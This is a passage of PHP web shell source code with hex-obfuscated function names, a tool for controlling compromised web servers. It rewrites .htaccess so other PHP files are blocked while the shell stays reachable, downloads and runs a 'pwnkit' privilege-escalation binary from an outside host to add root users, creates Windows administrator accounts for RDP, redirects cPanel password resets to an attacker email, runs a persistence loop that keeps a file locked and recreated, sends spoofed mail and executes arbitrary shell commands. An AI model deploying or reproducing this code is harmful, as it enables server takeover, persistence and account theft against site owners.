    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    if ($fungsi[4]($DOC_ROOT)) {
        $htaccess = '
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>';
        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
        if ($put_htt) {
            success();
        } else {
            failed();
        }
    } else {
        failed();
    }
}


if (isset($_POST['save-editor'])) {
    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
    if ($save) {
        success();
    } else {
        failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    if (!$fungsi[3]('adminer.php')) {
        $fungsi[28]("adminer.php", $fungsi[11]($URL));
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
    }
}


if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit"));
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .mad-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
    }
}

if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['NMN-select'] == "delete") {
        foreach ($items as $it) {
            $repl = str_replace("\\","/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (is_dir($fd) || is_file($fd)) {
                $rmdir = unlinkDir($fd);
                $rmfile = $fungsi[24]($fd);
                if ($rmdir || $rmfile) {
                    success();
                } elseif ($rmdir && $rmfile) {
                    success();
                } else {
                    failed();
                }
            }
        }
    } elseif ($_POST['NMN-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\","/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (ExtractArchive($fd, $repl . '/') == true) {
                success();
            } else {
                failed();
            }
        }
    } elseif ($_POST['NMN-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\","/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
                compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
            }
        }
    }
}

if (isset($_POST['submit'])) {
    if ($_POST['resetcp'] == true) {
        $emailCp = $_POST['resetcp'];
        $path0cp = dirname($_SERVER['DOCUMENT_ROOT']);
        $pathcp = $path0cp . "/.cpanel/contactinfo";
        $contactinfo = '
"email" : "' . $emailCp . '"
        ';
        if ($fungsi[3]($pathcp)) {
            $fungsi[28]($pathcp, $contactinfo);
            echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
        } else {
            failed();
        }
    }
    if ($_POST['create_folder'] === true) {
        $NamaFolder = $fungsi[12]($_POST['create_folder']);
        if ($NamaFolder) {
            success();
        } else {
            failed();
        }
    } elseif ($_POST['create_file'] == true) {
        $namaFile = $fungsi[13]($_POST['create_file']);
        if ($namaFile) {
            success();
        } else {
            failed();
        }
    } elseif ($_POST['renameFile'] == true) {
        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
        if ($renameFile) {
            success();
        } else {
            failed();
        }
    } elseif ($_POST['touchFile'] == true) {
        $newdate = strtotime($_POST['touchFile']);
        $filePath = unx($_GET['touch']);
        if ($newdate !== false) {
            $touchFiles = $fungsi[13]($filePath, $newdate);
            if ($touchFiles){
                success();
            } else { 
                failed();
            }
        } else {
            failed();
        }
    } elseif ($_POST['chFile']) {
        $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
        if ($chFiles) {
            success();
        } else {
            failed();
        }
    } elseif (isset($_POST['add-username']) && isset($_POST['add-password'])) {
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .mad-root');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } elseif ($fungsi[3]('.mad-root')) {
            $response = $fungsi[11]('.mad-root');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
                $username = $_POST['add-username'];
                $password = $_POST['add-password'];
                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
            } else {
                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
            }
        }
    } elseif ($_POST['lockfile'] == true) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler'));
        }
        mkdir($TmpNames . "/.sessions");
        cmd("cp $flesName " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
        cmd("chmod 444 " . $flesName);
        $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $fungsi[0]() . '")){
        mkdir("' . $fungsi[0]() . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text));
    }
    if (NMN_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (NMN_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}

function NMN_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
        if ($hndlers) {
            cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
            success();
        } else {
            failed();
        }
    } elseif ($_POST['add-rdp'] == True) {
        $userRDP = $_POST['add-rdp'];
        $passRDP = $_POST['add-rdp-pass'];
        if (stristr(PHP_OS, "WIN")) {
            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
            if ($procRDP) {
                cmd("net localgroup administrators " . $userRDP . " /add");
                success();
            } else {
                failed();
            }
        } else {
            failed();
        }
    } elseif ($_POST['mail-from-smtp'] == True) {
        $emailFrom = $_POST['mail-from-smtp'];
        $emailTo = $_POST['mail-to-smtp'];
        $emailSubject = $_POST['mailto-subject'];
        $messageMail = $_POST['message-smtp'];
        $headersMail = 'From: ' . $emailFrom . '' . "\r\n" .
            'Reply-To: ' . $emailFrom . '' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
        if ($procMailSmTp) {
            success();
        } else {
            failed();
        }
    }
}

if ($_GET['response'] == "success") {
    echo "<script>
Swal.fire({
    icon: 'success',
    title: 'Sucesss...',
    text: 'Done Success!',
    confirmButtonColor: '#22242d',
})</script>";
} elseif ($_GET['response'] == "failed") {
    echo "<script>
Swal.fire({
    icon: 'error',
    title: 'Failed...',
    text: 'Something wrong!',
    confirmButtonColor: '#22242d',
})
    </script>";
}


function success()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
}
function failed()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
}

function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}


function hx($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unx($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}

function suggest_exploit()
{
    $uname = $GLOBALS['fungsi'][8]();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}
function s()
{
    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

function cmd($in, $re = false)
{
    $out = '';
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("\x65\x78\x65\x63")) {
            @$GLOBALS['fungsi'][16]($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                $GLOBALS['fungsi'][21]($f);
            }
        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
        }
    } catch (Exception $e) {
    }
    return $out;
}


function winpwd()
{
    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
}

function compressToZip($sourceFile, $zipFilename)
{
    $zip = new ZipArchive();

    if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
        $zip->addFile($sourceFile, basename($sourceFile));
        $zip->close();
        success();
    } else {
        failed();
    }
}

function remove_slash($val)
{
    $tex = str_replace("/", "", $val);
    $tex1 = str_replace(":", "", $tex);
    $tex2 = str_replace("_", "", $tex1);
    $tex3 = str_replace(" ", "", $tex2);
    $tex4 = str_replace(".", "", $tex3);
    return $tex4;
}

function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir =  $dirs[$i];
        else
            break;

        if ($openDir = opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {

                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
                        $dirs[] = $dir . "/" . $readDir;
                    } else {

                        $files[] = $dir . "/" . $readDir;
                    }
                }
            }
        }
    }



    foreach ($files as $file) {
        $GLOBALS['fungsi'][24]($file);
    }
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        $GLOBALS['fungsi'][25]($dir);
    }
}

function remove_dot($file)
{
    $FILES = $file;
    $pch = explode(".", $FILES);
    return $pch[0];
}


function windowsDriver()
{
    $winArr = [
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
    ];
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
        }
    }
}

function namaPanjang($value)
{
    $namaNya = $value;
    $extensi = pathinfo($value, PATHINFO_EXTENSION);
    if (strlen($namaNya) > 30) {
        return substr($namaNya, 0, 30) . "...";
    } else {
        return $value;
    }
}

function extractArchive($archiveFilename, $extractPath)
{
    $zip = new ZipArchive();

    if ($zip->open($archiveFilename) === TRUE) {
        $zip->extractTo($extractPath);
        $zip->close();
        return true;
    } else {
        return false;
    }
}

function perms($file)
{
    $perms = $GLOBALS['fungsi'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
